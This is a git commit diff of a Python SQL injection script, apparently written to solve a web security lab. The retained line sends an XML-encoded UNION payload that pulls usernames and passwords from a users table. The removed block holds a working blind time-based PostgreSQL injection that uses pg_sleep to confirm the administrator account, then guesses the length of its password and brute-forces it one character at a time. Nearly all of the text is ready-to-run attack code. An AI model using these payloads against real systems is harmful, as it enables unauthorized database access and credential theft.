7ab055cac73c331716d225227dad0386651f8638
Vincenzo Minolfi <vincenzo.minolfi@gmail.com>
2026-08-22 12:05:47 +0200

    Removes useless code

--- sql_injection_xml_encoding.py
+++ sql_injection_xml_encoding.py
@@ -80,48 +80,6 @@ async def main():
     raw_req_10 = RAW_REQUEST.replace("@@@PAYLOAD@@@", xmlencode("1 UNION SELECT username || '~' || password FROM users"))
     print('FINAL ATTACK:', end='')
     await print_net_result(raw_req_10, True)
-
-
-    return
-
-    raw_req_2 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--")
-    print('WITH DELAY:', end='')
-    await print_net_result(raw_req_2, False)
-
-    # Response takes no extra time
-    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--")
-    print('WITHOUT DELAY:', end='')
-    await print_net_result(raw_req_3, False)
-
-    # Response takes extra time if administrator user exists
-    raw_req_4 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--")
-    print('Check administrator user existence:', end='')
-    await print_net_result(raw_req_4, False)
-
-    # We could use "greather than" instead of "equals" and use binary search for the length, but I kept it simple!
-    pwd_len = None
-    for i in range(1, 40):
-        payload = """'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=@@@LEN@@@)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--""".replace("@@@LEN@@@", str(i))
-        raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
-        print(f'administrator password length {i}:', end='')
-        (ok, secs) = await print_net_result(raw_req_5)
-        if ok and secs > 8:
-            pwd_len = i
-            break
-
-    import string
-    pwd = ''
-    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
-    for i in range(1, pwd_len+1):
-        for c in charset:
-            payload = f"""'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{c}')+THEN+pg_sleep(8)+ELSE+pg_sleep(0)+END+FROM+users--"""
-            raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
-            print(f'administrator password {c} in position {i+1}:', end='')
-            (ok, secs) = await print_net_result(raw_req_8)
-            if ok and secs > 7:
-                pwd += c
-                print(f'Password so far: {pwd}')
-                break
     
 
 if __name__ == "__main__":
